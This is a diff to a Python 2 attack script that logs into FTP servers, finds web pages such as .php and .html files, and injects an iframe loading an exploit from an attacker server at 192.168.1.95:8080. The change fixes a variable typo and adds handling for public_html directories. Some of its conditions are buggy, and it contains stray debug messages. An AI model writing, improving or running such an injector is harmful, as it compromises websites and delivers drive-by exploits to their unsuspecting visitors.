@@ -39,13 +39,24 @@ def returnDefault(ftp):
 		print '[-] Skipping To Next Target.'
 		return
 	retList = []
+	
 	for fileName in dirList:
 		fn = fileName.lower()
-		if '.php' in fn or '.htm' in fn or '.asp' in fn or '.html' in fn or '.aspx':
-			print '[+] Found default page: ' + fileName
-			retList.append(fileName)
-			redirect='<iframe src="http://192.168.1.95:8080/exploit"></iframe>'
-			injectPage(fpt,fileName,redirect)
+		if fn !='public_html':
+			if '.php' in fn or '.asp' or '.aspx' in fn or '.html' in fn or '.htm' in fn:
+				print '[+] Found default page: ' + fileName
+				retList.append(fileName)
+				redirect='<iframe src="http://192.168.1.95:8080/exploit"></iframe>'
+				injectPage(ftp,fileName,redirect)
+		else:
+			print 'here try 4 or something'
+			try:
+				dirList=ftp.cwd('public_html')
+			except:
+				print '[-] no no no no no no'
+			
+
+		
 	return retList
 	
 def injectPage(ftp, page, redirect):
